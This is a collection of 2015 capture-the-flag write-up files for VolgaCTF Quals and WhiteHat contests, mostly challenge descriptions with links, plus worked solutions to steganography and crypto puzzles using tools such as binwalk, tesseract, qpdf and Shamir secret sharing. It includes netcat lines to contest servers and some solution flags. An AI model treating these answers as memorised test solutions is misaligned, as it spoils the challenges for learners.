> nc pwnie.2015.volgactf.ru 7777
> 
> [my_little_pwnie](http://files.2015.volgactf.ru/my_little_pwnie/my_little_pwnie)

## Write-up

(TODO)

## Other write-ups and resources

* <https://www.whitehatters.academy/volgactf-2015-mylittlepwnie/>
* <https://github.com/Team-Sportsball/CTFs-2015/blob/master/VolgaCTF/My%20Little%20Pwnie.md>
* <http://bruce30262.logdown.com/posts/276921-volgactf-quals-ctf-2015-my-little-pwnie>
* <https://blog.tinduong.pw/volgactf-2015-exploit-write-ups/>
* <http://ww9210.cn/2015/05/04/volgactf-writeupinterstellar-tiny_bash-mathproblem-database-pwnie/>
* <https://gist.github.com/g05u/5be6f198fbde723ac178>
# VolgaCTF Quals CTF write-ups

* <http://2015.volgactf.ru/>
* [Scoreboard](http://2015.volgactf.ru/scoreboard) or [local alternative](score.txt)

## Completed write-ups

* [pwn/bash](pwn/bash)
* [pwn/database](pwn/database)
* [stego/captcha](stego/captcha)
* [stego/poem](stego/poem)
* [stego/strange-text](stego/strange-text)
* [stego/tlsb](stego/tlsb)

## External write-ups only

* [admin/remote-web](admin/remote-web)
* [crypto/carry](crypto/carry)
* [crypto/cpkc](crypto/cpkc)
* [crypto/gostfuscator](crypto/gostfuscator)
* [crypto/lcg](crypto/lcg)
* [crypto/rsa](crypto/rsa)
* [crypto/russian-doll](crypto/russian-doll)
* [joy/homework](joy/homework)
* [joy/relax-and-enjoy](joy/relax-and-enjoy)
* [joy/world-art](joy/world-art)
* [ppc/mathproblem](ppc/mathproblem)
* [pwn/my-little-pwnie](pwn/my-little-pwnie)
* [recon/find-him](recon/find-him)
* [recon/yacst](recon/yacst)
* [reverse/interstellar](reverse/interstellar)
* [stego/midi](stego/midi)
* [web/hack-t-private-site-1](web/hack-t-private-site-1)
* [web/web2](web/web2)

## Missing write-ups

* [crypto/rusty-idea](crypto/rusty-idea)
* [web/hack-t-private-site-2](web/hack-t-private-site-2)
* [web/malware](web/malware)# VolgaCTF Quals CTF 2015: Find Him

**Category:** Recon
**Points:** 250
**Solves:** 154
**Description:**

> Find Greg Medichi he is from Sydney, his code contains a valuable data

## Write-up

(TODO)

## Other write-ups and resources

* <http://lockboxx.blogspot.com/2015/05/volgactf-2015-quals-writeup-homework.html>
* <http://fadec0d3.blogspot.com/2015/05/volga-ctf-2015-find-him-recon-250.html>
* <https://www.whitehatters.academy/volgactf-2015-findhim/>
# VolgaCTF Quals CTF 2015: YACST

**Category:** PPC | Recon
**Points:** 200
**Solves:** 105
**Description:**

> Try to solve another captcha - [server](http://yacst.2015.volgactf.ru/)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.rogdham.net/2015/05/03/volgactf-2015-quals-write-ups.en>
* <https://github.com/Team-Sportsball/CTFs-2015/blob/master/VolgaCTF/YACST.md>
* <https://takt0rs.wordpress.com/2015/05/05/volgactf-2015-quals-yacst/>
# VolgaCTF Quals CTF 2015: interstellar

**Category:** Reverse
**Points:** 200
**Solves:** 78
**Description:**

> Just a small binary from a far-far galaxy
> [interstellar](http://files.2015.volgactf.ru/interstellar/interstellar)

## Write-up

(TODO)

## Other write-ups and resources

* <http://www.rogdham.net/2015/05/03/volgactf-2015-quals-write-ups.en>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/VOLGACTF/reversing/interstellar>
* <http://lockboxx.blogspot.com/2015/05/volgactf-2015-quals-writeup-homework.html>
* <https://www.whitehatters.academy/volgactf-2015-interstellar>
# VolgaCTF Quals CTF 2015: captcha

**Category:** Stego | PPC
**Points:** 150
**Solves:** 145
**Description:**

> We've got a rather strange png file. Very strange png. Something isn't right about it...
> 
> [png](http://files.2015.volgactf.ru/captcha/capthca.png)

## Write-up

by [polym](https://github.com/abpolym)

We are given a big PNG file and apply `pngcheck` on it to find that it produces an error:

```bash
+bash-4.3$ pngcheck capthca.png 
capthca.png  additional data after IEND chunk
ERROR: capthca.png
```

We can either use a hex editor of our choice or `binwalk` to find that this PNG contains several other PNGs that we then can extract using `foremost`.

All in all, we get around 1900 PNGs, each containing a single character like this one:

![](00000045.png)

Looking at the last PNG, which is a `=`, we are sure that this is a base64 encoded string - the flag.

Before we can apply OCR to get the characters inside each PNG, we might consider hashing all files to reduce the number of possible mistakes by OCR tools:


```bash
+bash-4.3$ md5 -r * | awk '{print $1}' | sort | uniq -c | sort -n
   1 bdbd14948b0daa296ee4cf65e31ade15
   6 66e198735f47802c681c2151ee1090a4
  10 364c1666e2a89a5a64abe2d8e4b69580
  11 e2a7e99259104faabdfa2d26fef87586
  12 633200dd07b7e6197fc256a5fe571fc3
  12 69dc95333d32482337e7ef3c5097f4a3
  12 740d93829104827612a6a65eadb51f8e
  13 c107ea1ce43ef945145fb3f3790efeba
  14 a30d78a371704616a79c59ce20254cb6
  14 ec9e74a5f18847ddf04afe3d4064d22f
  15 20a02330b64a6ac42d84409e7867ff7c
  15 a8d6a8ac9e446affeb4261989a0baf50
  16 75471ca31da82c6f29fc5ec52dcf933f
  17 59a2345aae9ca2dd964ed1b61b0d460f
  18 609f644c2a044c364d5b9d743771de5e
  18 788e99506baca3d86eaad8c70cb84b36
  18 83cd79335ab3a759c99c84951b438838
  18 8d04f1fab0dddf0078a6d484d07f02a0
  18 d2013375b9f3ce21eb7a976e318167fb
  19 471e55d2cc16b3fe059e5ac9db0b31a1
  19 4d54b9e8c5618e1a0a027a35e7e0da3a
  20 18dc10da8f69c7f820964ca96c0831e1
  20 3faed2c01fad265ff59ab4791191b71a
  20 e9036e10c51334f8029929346dad5247
  21 49628fa64b0def5091e08cdd3bf92466
  21 c3214d0a5ab8ebc9f8f5f0416aea3b0d
  21 eb895ce9ad684a436665455f2db6e75d
  21 fde17b9751ca0fd02d103665ee806f24
  22 0757d43ab407cf09795ec741c4baca9c
  22 462b1bf11e61e1b1332e2f8e1c865489
  22 4a0648e7fc1c581fe19b90be6980110e
  22 4c518e3aa75477e98233e6b53e22a6ea
  22 54476bec9c688b7ddd1adc4dd177a30b
  23 0a8d1c7c7a1a3c2fa6570466305f0fd5
  23 2e691ba6943d759011a26c1de27fe70a
  23 644abdaaf808e4a2c75e2f2bcc347d3b
  24 28116c5219fdfe8233c26b5d9a6ba365
  24 7f7dd718aeceb6611edd34be8ee7a764
  24 b9d3f5b5889d10dae01c6f0ba8b5bb81
  25 1d06709d39b274054c8d7c778efaf9d7
  25 553cda794ad7557f8df76e1267c2bf4e
  25 75c2eb65189cbb54e437e139babf9788
  25 861dafbdd50792dc0648224639ce3963
  27 0872c31957efbd5587cdd8f0f3604b06
  28 ab8eec8c6d11e0ae0ae4848977d33c00
  28 df752942d48f765581979acae753ecf7
  29 90852d860e5058ed680ecf4fe3169c30
  29 a9684435587bc1ed84f8de134699b839
  30 0a6a19465a6a764cbea3b3276479db63
  30 8b7ce96904721935d677bc49a698d02e
  30 b33a799e16ead448c784b3fd4b6714b1
  31 52e387013dc79eb6a4f2557a099cd8a0
  32 34446e948f180db5bf8986c5f29a8599
  33 fb98f9311224624c8c36fc7ccfd558c7
  34 83175ff226605efce6dbc3878cee6418
  34 886a6a17d8c57bbc1ed119ea142600f8
  35 4ab6fe2ac42ca0f36a6bf00b291c331c
  37 86817e1c3e6b700f10495c58fcc90f0f
  37 b8c6e1ca952a11cd10096eff68dfdd22
  57 de3b40428ae92e6e76f0e4eb55bb90c4
  59 77c1999c75eacb9fee0b1e9b38a6d2b2
  89 fcb15452ffc5301b316b2ca78b9c3e72
  92 191a934656f747af98996dc86ff7c18f
 116 ca9f9515e27151a05ff3c0ca5c20a1a1
 184 5270cbd314b24e11cec0f03a86d1bf41
+bash-4.3$ md5 -r * | awk '{print $1}' | sort | uniq -c | sort -n | wc
      65     130    2470
```

Looks like we just need to get characters of 65 unique files :).

Using [this python script](./uniques.py), we first a sample PNG for each unique hash and save it to `uniques.txt`:

```bash
+bash-4.3$ python2.7 uniques.py output/png/ > uniques.txt
```

After that, we apply `tesseract` with pagesegmode `10` (To treat an image as a single character) on [uniques.txt](./uniques.txt) and save the output to [ocr.txt](./ocr.txt)

```bash
+bash-4.3$ cat uniques.txt | awk '{print $1}' | while read f; do tesseract "output/png/$f" txt -psm 10; echo -n "$f " && cat txt.txt; done 2>1 | grep 'png' > ocr.txt
```

Now we can use the `join` command to join the two text files to get a correlation between hash and OCR character:

```bash
+bash-4.3$ join ocr.txt uniques.txt > joined.txt
```

We have to fix some missing character (`j`) in [joined.txt](./joined.txt) and try to build our base64 encoded flag string using [buildflag.py](./buildflag.py):

```bash
+bash-4.3$ python2.7 buildflag.py output/png/ joined.txt 
.VBO.W0KG90AAAANSUhEU9AAA.AAAACDCAIAAADK7dMbAAAAAXNS.0IAFS4C.QAAAA.nQU1BAACXjWV8YQUAAAAJCEhZCWAADSMAAA7DACdVqGQAAAUfSU.BVHhe7dhtYt0WEEV.1SWCWA+FYTNdTOq.hTSjD.NHEmjSe37Z8k9.GV.T.PQBYBmBAQQEBhAQGEBAYAAB9QEEBAYQEBhAQGAAAYEBBAQGEBAYQEB9AAGBAQQEBhAQGEBAYAAB9QEEBAYQEBhAQGAAAYEBBAQGEBAYQEB9AAGBAQQEBhAQGEBAYAAB9QEEBAYQEBhAQGAAAYEBBAQGEBAYQEB9AAGBAQQEBhAQGEBAYAAB9QEEQmD+XM+n0+I8/ZPVB.ZkCSS3/53b5TQ4/fSdjMVf7Zd..Ok7mW.j7/VZb3W.MOU.P.Z.Iq.Vetf+2JKnJZ.IJSDVO30nBOb7NV+ALZj.emAGn283JDe0.qVPjF3U.YIPITDVNVXCUt+JVUB0PVIWP8T4MATmdYZfVDCGPV37Zdjf5WbD5be0O3t0t8/XIW++OmGjSVVm7.jIJq71I0U3SVP1t9/VIX3/S.0+X..1S5V.XC1mSV.ITXTt28X8O1XkbVDfNLUOTBSeFt804.YfNjOZFW+FFG5qSU3GVn1ZLdVq3FPW87CVY8UBGe1VX0.2N507tKf5MkZ2S70VXmqZFeTf59NU/.PefD/P0P.7ZkKN.8GPhVmZfdSJV.Zf+/UnbG.PKOVhkdTNfmPj.+GW.0..57.+2VqSU5dZ.K.MZ0VN3WS7HGW.WbE/3Db../0C1VP9mm3VUU3D8Wbd+CMUHSCV2eW0IZE3CdLb+NXHVtq.7Wm.bCbdPOm+7km.mq0/5S.US7dIUU5jA21Zb.I+1IG7dGPJ00nCNUNd3.PW0K/YTXtS/LCXQ8S/YUZH.Mb.Sf1je+LCOX.tOhDL7C.SMUCmTn0bdXBHm+YTe.FMdbfUMU7FntSF2fPZN.OdVIV0ZdT72EBb1PVXN33eX/+9m.YVOdW1bUP3nWV.1WVG4jbbSH3SO3ZWd/WNk2/q43TmMU.b7k84NC.Z0QendXMPeUSX..UO.7PXN2m.F.3I210ZW//IPtStHIt2.7GBtqW3qXed57VSCF5XE8PjFW7UPkV3.8mmhXWY.X8eb.UQ2UPJ9Wmb.Yb.SCVjCGWbLV3bZCIJBntVXU8VCBMnVXXNPCtmW1DjWFnUIJWU0mbfWDWPG.X/XK.7HfPA/C515jf.JX3VZM3U.jI5.JjWCe.+UZ.fLm.eeqJU37+IW00Zq8mjVhEKmjbSVmhq5CWBVY3V0V8mIVOVB4fnqCVZVXU4VTQt1PFQUIS0j4XH.TUBUT+SW7N/7Ff.8h.Um/P5Xj0m.X/YUW.F7.Dhe1PGQ5MTSSKeJC/TfI.bQTPS.fZNS5.1.fGm7qCbUnSP..3HX8d.PPSPWOCd7NMPSfjJVUCFVOCI9XnNkbDqV+XINWYm7db8qP.K8.dS.fCAT0/8XX2f.5N5eCtLO.j0BYFJU3/..VSEB9CBAQQEBhAQGEBAYAAB9QEEBAYQEBhAQGAAAYEBBAQGEBAYQEB9AAGBAQQEBhAQGEBAYAAB9QEEBAYQEBhAQGAAAYEBBAQGEBAYQEB9AAGBAQQEBhAQGEBAYAAB9QEEBAYQEBhAQGAAAYEBBAQGEBAYQEB9AAGBAQQEBhAQGEBAYAAB9QEEBAYQEBhAQGAAAYEBBAQGEBAYQEB9AAGBAQQEBhAQGEBAYAAB9QEEBAYQEBhAQGAAAYEBBAQGEBAYQEB9AAGBAQQEBhAQGEBAYAAB9QEEBAYQEBhAQGAAAYEBBAQGEBAYQEB9AAGBAQQEBIj28fEX4WPZ1G.2Y.CAAAAASUVO.K5CYII_
```

Since OCR tools are not perfect, we have to check several hash to character translations by hand, especially characters such as `i`, `l`, `I` etc.
We can test on duplicate characters using `cat joined.txt | awk '{print $2}' | sort | uniq -c | sort -n`.

Using our second and final version of [joined.txt](./joined_final.txt), we see that the output, base64 decoded, is a flag inside a PNG:

![](./flag.png)
## Other write-ups and resources

* <https://neg9.org/news/2015/5/3/volga-quals-2015-captcha-stegoppc-150-writeup>
* <http://www.mrt-prodz.com/blog/view/2015/05/volgactf-2015-quals---captcha-150pts-writeup>
* <https://www.whitehatters.academy/volgactf-2015-captcha/>
* <http://capturetheswag.blogspot.com.au/2015/05/captcha-weve-got-rather-strange-png-file.html>
# VolgaCTF Quals CTF 2015: midi

**Category:** Stego
**Points:** 150
**Solves:** 21
**Description:**

> Op.12 No.7.
> 
> [song](http://files.2015.volgactf.ru/midi/output.mid)

## Write-up

(TODO)

## Other write-ups and resources

* <https://www.whitehatters.academy/volgactf-2015-midi/>
# VolgaCTF Quals CTF 2015: poem

**Category:** Stego
**Points:** 100
**Solves:** 28
**Description:**

> Enjoy each of the sonnets equally.
> 
> [poem](http://files.2015.volgactf.ru/poem/poem.pdf)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on two writeups: A writeup by [whitehatters](https://www.whitehatters.academy/volgactf-2015-poem/) and a [Japanese writeup](http://sioncojp.hateblo.jp/entry/2015/05/14/201258)

We are given a PDF with a poem verbatim copied from an original poem.

The first thing that stands out is the varying spaces between each line.

We decompress the PDF (content) streams using `qpdf --qdf --object-streams=disable poem.pdf out.pdf` and see the decompressed streams by opening `out.pdf` in `vim`:

![](./stream.png)

The highlighted (yellow) parts are text-positioning operators that move a text line. See the [Adobe PDF reference page 330](http://partners.adobe.com/public/developer/en/pdf/PDFReference.pdf) for more details.

In this case, a `Td` text line operator has two operands.
The first operand in our case almost always 0, the second is most of the time `-14.xxx` or `-17.xxx`. - Correct me, if I am wrong :).

The authors encoded a binary string into the second operand of each `Td` operator: `14` is `0` and `17` is `1`.

We can use [this script](./parsepdf.py) to (almost) extract the hidden binary:

```
+bash-4.3$ python2.7 parsepdf.py out.pdf
FLAG: {size_does_mattej_afxer_dll}
```

The script tries to recover the actual flag, which is `{size_does_matter_after_all}`, by adding missing, hidden bits after each stream - so far it is unknown where they are hidden.

## Other write-ups and resources

* <https://www.whitehatters.academy/volgactf-2015-poem/>
* [Japanese](http://sioncojp.hateblo.jp/entry/2015/05/14/201258)
# VolgaCTF Quals CTF 2015: strange text

**Category:** Stego | PPC
**Points:** 350
**Solves:** 27
**Description:**

> We found some text with strange symbols - can you get a flag? [link](http://files.2015.volgactf.ru/strange_text/text.txt)

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on a writeup by [rogdham](http://www.rogdham.net/2015/05/03/volgactf-2015-quals-write-ups.en).

We are given a strange text file containing some float numbers.

This is (x,y) coordinates data that we have to plot, whereas the x points contain a group key.

If we for example split the data on `,`, we get this:

```
[...]
0.09.491787910461426
0.3002592921257019
0.09.47504711151123
0.30399078130722046
[...]
```

Here, `0.09.491787910461426` is an x point `0.491787910461426` with key `09` and `0.3002592921257019` is the related y point.

We can plot each of these points using [matplotlib](http://matplotlib.org/api/pyplot_api.html).

[This python script](./plotit.py) does the job and produces the final flag picture:

![](./result.png)

The flag is `{!F0rG0tMYUV}`.

## Other write-ups and resources

* <http://www.rogdham.net/2015/05/03/volgactf-2015-quals-write-ups.en> 
# VolgaCTF Quals CTF 2015: tlsb

**Category:** Stego
**Points:** 400
**Solves:** 4
**Description:**

> There must be a hidden message somewhere.
> 
> [stego](http://files.2015.volgactf.ru/tlsb/stego.png)
> 
> Hints
> 
> 2 bpp. That's incredible.
> 
> 2x3 matrix embedding.
> 
> Jessica Fridrich would solve this task easily.

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based no a writeup by [whitehatters](https://www.whitehatters.academy/volgactf-2015-tlsb/).
Also can be read [here](http://www.symbiosysconsulting.com/articles/intro-to-stenography).

The title and hints of this task refer to hiding data in the [least significant bit](http://www.lia.deis.unibo.it/Courses/RetiDiCalcolatori/Progetti98/Fortini/lsb.html) by applying a 2x3 matrix embedding to achieve storing 2 `bpp` - bits per pixel.

The hints suggest to read a paper by [Jessica Fridrich](http://ws.binghamton.edu/fridrich/Research/large_payloads-spie.pdf), but the most helpful paper is actually a paper by [Andreas Westfeld](http://www2.htw-dresden.de/~westfeld/publikationen/21370289.pdf).
The latter paper is reference by the former, which tells us that the hint was to read the references of the former paper by Jessica Fridrich.

In the section `Matrix encoding`, we read following:

![](./matrix-encoding.png)

We try to retrieve the stored bits `x1` and `x2` from the least significant bits (lsb) of the red (`a1`), green (`a2`) and blue (`r3`) values.

This is done using [this python script](./tlsb-stego.py):

```bash
+bash-4.3$ python2.7 tlsb-stego.py stego.png out.bin
```

The resulting output `out.bin` is a PNG:

```bash
+bash-4.3$ file out.bin
out.bin: PNG image data, 1152 x 648, 8-bit/color RGB, non-interlaced
```

We open it and see the flag:

![](./out.png)

## Other write-ups and resources

* <https://www.whitehatters.academy/volgactf-2015-tlsb/> or [here](http://www.symbiosysconsulting.com/articles/intro-to-stenography)
# VolgaCTF Quals CTF 2015: Hack-T private site - 1

**Category:** Reverse | Web | Pwn
**Points:** 400
**Solves:** 6
**Description:**

> HackT is a group of Australian hackers and are our direct rivals. They didn't want to share their secrets, and we have been looking for ways of compromising their system for many years. And now we have a great opportunity to do it! We have managed to obtain a copy of the HackT webserver binary. Are you able to break their website and help us in stealing their private data?
> 
> Note: This task consists of two parts, which can be solved strictly sequentially. Enter the flag of the tiny secret page here.
> 
> http://notawebtask.2015.volgactf.ru:7777
> [webserver](http://files.2015.volgactf.ru/notawebtask/webserver)

## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/g05u/2671db914f24968d7932>
# VolgaCTF Quals CTF 2015: Hack-T private site 2

**Category:** Reverse | Web | Pwn
**Points:** 500
**Solves:** 1
**Description:**

> HackT is a group of Australian hackers and are our direct rivals. They didn't want to share their secrets, and we have been looking for ways of compromising their system for many years. And now we have a great opportunity to do it! We have managed to obtain a copy of the HackT webserver binary. Are you able to break their website and help us in stealing their private data?
> 
> Note: This task consists of two parts, which can be solved strictly sequentially. Enter the flag of the secret page here.
> 
> http://notawebtask.2015.volgactf.ru:7777
> [webserver](http://files.2015.volgactf.ru/notawebtask/webserver)
> 
> Hints
> 
> Every member of HackT has a copy of libchallenge.so in order to quickly pass the challenge on authentification. Are we able to obtain a copy to ourselves?
> 
> We have managed to leak some libraties that support Hact-T webserver functionlity.
> Note: this libs are not vulnerable, they are provided if you want to run the copy of webserver locally.
> [libglib](http://files.2015.volgactf.ru/notawebtask/libs/libglib-2.0.so)
> [libmicrohttpd](http://files.2015.volgactf.ru/notawebtask/libs/libmicrohttpd.so.10.29.0)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# VolgaCTF Quals CTF 2015: malware

**Category:** Reverse | Web
**Points:** 200
**Solves:** 10
**Description:**

> We've found a suspicious app installed on one of our employee's cell phone.
> As far as we can tell the adversary - the man who wrote this app - is located in Samara City, Russia.
> 
> [f.apk](http://files.2015.volgactf.ru/malware/f.apk)
> 
> Hints
> 
> First hint is in http headers. No need to brute anything.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# VolgaCTF Quals CTF 2015: web2

**Category:** Web
**Points:** 200
**Solves:** 25
**Description:**

> Find the key!
> 
> http://web2.2015.volgactf.ru/
> 
> Hints
> 
> Find the logs!

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/VOLGACTF/web/web2> 
# WhiteHat Contest 10 2015: crypto100

**Category: Cryptography**
**Points: 100**
**Solves: 17**
**Author: WhiteHat Wargame**
**Description:**

> Do you love Arithmetic?

> [file](crypto100_c3747ddbe535de5601206babb456191b)


## Write-up

by [x0w1](https://github.com/x0w1)

There must be 50 letters encoded in 10 numbers, 5 letters per number. All given numbers are less then 1. There are 64 letters in the charset.

If we multiply the first number and 64, we get 49.127273917. 49 is the position of letter "W" in the charset (if we start counting from 1). We take only fractional part of the new number and myltiply it x64:
.127273917 x 64 = 8.145530688, 8 - is number of "h" in the charset. This way we get "White" from the first given number. To get "Hat{" from the second number we need to substract 1 from encoded letter position
"H" = charset\[floor(0.5474434438*64) - 1\] (charset starts from 1, don't forget)

To decode N-th number:

    n = {N-th_number}
    for i = 0 to 4
        n = frac(n)*64
        char[i + N * 5] = charset[floor(n) - N - 1] //(if charset starts from the 0th element)

## Other write-ups and resources

* none yet
# WhiteHat Contest 10 2015: crypto200

**Category: Cryptography**
**Points: 200**
**Solves: 8**
**Author: WhiteHat Wargame**
**Description:**

> Secret Sharing

> [file](crypto200_43637d719c7a8bd53f018e7fa6f5b83f)

## Write-up

by zhencui

It's a case of [Shamir's Secret Sharing](https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing). Compute [Lagrange basis polynomials](https://en.wikipedia.org/wiki/Lagrange_polynomial) and decode the constant term with ASCII.

Result is:    `Secret Sharing Scheme provides a way of sharing a secret among several people, but keep your piece safety. WhiteHat{659ac167e063b1e9564f5c9211098dc8940d0d75}`

## Other write-ups and resources

* none yet
# WhiteHat Contest 10 2015: crypto400

**Category: Cryptography**
**Points: 400**
**Solves: 11**
**Author: WhiteHat Wargame**
**Description:**

> Flag = WhiteHat{SHA1(output)}

> [file](crypto400_fd6f003c2def910487fda983adb64b06.zip)


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Contest 10 2015: pwn100

**Category: Pwnable**
**Points: 100**
**Solves: 15**
**Author: WhiteHat Wargame**
**Description:**

> OS:Ubuntu 14.04
>
>> lab33.wargame.whitehat.vn:10100
>
> [file](pwn100_3321681ef8000c50e11202aed9437f6c.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/whitehat-ctf-2015-pwn100/>
# WhiteHat Contest 10 2015: pwn200

**Category: Pwnable**
**Points: 200**
**Solves: 30**
**Author: WhiteHat Wargame**
**Description:**

> Ubuntu 14.04
>
> lab33.wargame.whitehat.vn:10200
>
> [file](pwn200_d1cc3c23ff91721177f2401d52c03191.zip)


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf-team.vulnhub.com/whitehat-ctf-2015-pwn200/>
* <http://pastebin.com/MEJP4ir7>
# WhiteHat Contest 10 2015: pwn300

**Category:Pwnable**
**Points: 300**
**Solves: 10**
**Author: WhiteHat Wargame**
**Description:**

> Ubuntu 14.04
>
>> lab33.wargame.whitehat.vn:10300
>
> [file](pwn300_818cf7d6db3c87a38aa4ed823b671206.zip) 


## Write-up

(TODO)

## Other write-ups and resources

* <https://gist.github.com/peternguyen93/f2e5cd0685dbd3849010>
# WhiteHat Contest 10 CTF write-ups

* <https://wargame.whitehat.vn/Contests/ChallengesContest/25>
* [Scoreboard](TODO) or [local alternative](./scoreboard)
* [Web challenges solutions - differ from those in this repo?](http://justpentest.blogspot.in/2015/07/whitehat-wargame-websecurity-challenges.html)

## Completed write-ups

* [crypto/crypto100](crypto/crypto100)
* [crypto/crypto200](crypto/crypto200)

## External write-ups only

* [pwn/pwn100](pwn/pwn100)
* [pwn/pwn200](pwn/pwn200)
* [pwn/pwn300](pwn/pwn300)
* [reverse/re200](reverse/re200)
* [reverse/re300](reverse/re300)
* [reverse/re400](reverse/re400)

## Missing write-ups

* [crypto/crypto400](crypto/crypto400)
* [web/web100](web/web100)
* [web/web200](web/web200)
* [web/web300](web/web300)
* [web/web400](web/web400)# WhiteHat Contest 10 2015: re200

**Category: Reverse Engineering**
**Points: 200**
**Solves: 37**
**Author: WhiteHat Wargame**
**Description:**

>
>> Flag = WhiteHat{SHA1(key)}
>
>>[file](re200_27571ecc6447ea425908a735b3ca219e.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://nnguwriteups.blogspot.ru/2015/07/whitehat-contest-10-reverse-200.html> 
# WhiteHat Contest 10 2015: re300

**Category: Reverse Engineering**
**Points: 300**
**Solves: 17**
**Author: WhiteHat Wargame**
**Description:**

> Flag = WhiteHat{SHA1(key)}
> The key is a string that has meaning
>
> [file](re300_7cb9f7846b7425cb6532fd55fb4b6b76.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/dqi/ctf_writeup/tree/master/2015/whitehat/reversing/re300> 
* <http://boaster.github.io/ctf/2015/07/25/WhiteHat-Contest-10-RE-300.html> or <http://uaf.io/reverse%20engineering/2015/07/25/WhiteHat-Contest-10-RE-300.html>
# WhiteHat Contest 10 2015: re400

**Category: Reverse Engineering**
**Points: 400**
**Solves: 7**
**Author: WhiteHat Wargame**
**Description:**

> Flag = WhiteHat{SHA1(upper(key))}
>
> [file](re400_524c6f057478be2bdef39998e3b334c4.zip)

## Write-up

(TODO)

## Other write-ups and resources

* [Vietnamese](http://namntvn.blogspot.de/2015/08/whitehat-contest-10-re400-writeup.html)
# WhiteHat Contest 10 2015: web100

**Category: Web Security**
**Points: 100**
**Solves: 7**
**Author: WhiteHat wargame**
**Description:**

> Membership v1
>
> http://lab11.wargame.whitehat.vn/contests/10/web100_00afb7f3909b44adf7a7a18bacaa53a2/
>

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Contest 10 2015: web200

**Category: Web Security**
**Points: 200**
**Solves: 6**
**Author: WhiteHat Wargame**
**Description:**

> Membership v2
>
> http://lab11.wargame.whitehat.vn/contests/10/web200_11846c9d4e44842fb2502566668567af/
> 

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Contest 10 2015: web300

**Category: Web Security**
**Points: 300**
**Solves: 7**
**Description:**

> Lucky Number
>
> http://lab10.wargame.whitehat.vn/contests/10/web300_27260d2ae82f63075954708d57e6d7c4/
> 

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Contest 10 2015: web400

**Category: Web Security**
**Points: 400**
**Solves: 1**
**Author: WhiteHat Wargame**
**Description:**

> Membership v3
>
> http://lab11.wargame.whitehat.vn:10400/
> 

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Grand Prix Qualification Round 2015: Buon Ma Thuot

**Category:** Cryptography
**Points:** 200
**Solves:** 6
**Description:**

> **Command**
> nc lab12.grandprix.whitehatvn.com 1337
> 
> nc lab12b.grandprix.whitehatvn.com 1337 (Mirror)
> 
> **Binary**
> [crypto200_00008a363c8975796108e7cad210c70e](crypto200_00008a363c8975796108e7cad210c70e)


## Write-up

(TODO)

## Other write-ups and resources

* [Vietnamese](https://forum.whitehat.vn/forum/wargame/whitehat-grand-prix/writeup-whitehat-grand-prix/53316-writeup-vong-loai-whitehat-grand-prix-2015-crypto100-crypto200-crypto250)
# WhiteHat Grand Prix Qualification Round 2015: Da Nang

**Category:** Cryptography 
**Points:** 400
**Solves:** 0
**Description:**

> We captured 2 of the messages from the criminal, but it looks like it was encrypted/obfuscated with some modern techniques that our tool could not determine. Please help find the secret.
> 
> [crypto400_bc5f524b0abe07ee86d18927307ef55b](crypto400_bc5f524b0abe07ee86d18927307ef55b)
> 
> Hint 1: 4880
> 
> Hint 2: try with luck
> 
> Hint 3: e2e


## Write-up

(TODO)

## Other write-ups and resources

* none yet
# WhiteHat Grand Prix Qualification Round 2015: Hoi An

**Category:** Cryptography
**Points:** 100
**Solves:** 18
**Description:**

> [http://lab14.grandprix.whitehatvn.com/index.php.s](http://lab14.grandprix.whitehatvn.com/index.php.s)
> 
> [http://lab14b.grandprix.whitehatvn.com/index.php.s](http://lab14b.grandprix.whitehatvn.com/index.php.s) (Mirror)


## Write-up

(TODO)

## Other write-ups and resources

* [Vietnamese](https://forum.whitehat.vn/forum/wargame/whitehat-grand-prix/writeup-whitehat-grand-prix/53316-writeup-vong-loai-whitehat-grand-prix-2015-crypto100-crypto200-crypto250)
# WhiteHat Grand Prix Qualification Round 2015: Tam Dao

**Category:** Cryptography
**Points:** 250
**Solves:** 12
**Description:**

> [http://lab11.grandprix.whitehatvn.com:1337](http://lab11.grandprix.whitehatvn.com:1337)
> 
> [http://lab11b.grandprix.whitehatvn.com:1337](http://lab11b.grandprix.whitehatvn.com:1337) (Mirror)


## Write-up

(TODO)

## Other write-ups and resources

* [Vietnamese](https://forum.whitehat.vn/forum/wargame/whitehat-grand-prix/writeup-whitehat-grand-prix/53316-writeup-vong-loai-whitehat-grand-prix-2015-crypto100-crypto200-crypto250)
# WhiteHat Grand Prix Qualification Round 2015: Ca Mau

**Category:** Forensics
**Points:** 100
**Solves:** 64
**Description:**

> View me
> 
> [http://material.grandprix.whitehatvn.com/for100_2c698f97bca6186011c351dfdcd20c23](http://material.grandprix.whitehatvn.com/for100_2c698f97bca6186011c351dfdcd20c23)
> [http://materials.grandprix.whitehatvn.com/for100_2c698f97bca6186011c351dfdcd20c23](http://materials.grandprix.whitehatvn.com/for100_2c698f97bca6186011c351dfdcd20c23) (Mirror)


## Write-up

by [polym](https://github.com/abpolym)

This write-up is based on following write-ups:

* <https://github.com/teamavidya/ctf/tree/master/2015_whitehat_quals/ca_mau%5Bforensics100%5D>
* [Vietnamese](https://blog.tinduong.pw/whitehat-grandprix-global-challenge/)

We are given a video of several colored bouncing balls, viewable [here](https://www.youtube.com/watch?v=h-E8FpNbVeA).

If you watch the video, you sometimes see frames that seem to contain something else than just bouncing balls.

Therefore, we extract all individual frames to find these different frames:

```bash
$ ffmpeg -i for100.mp4 for100-%d.png
[...]
$ ls -lS 
[...]
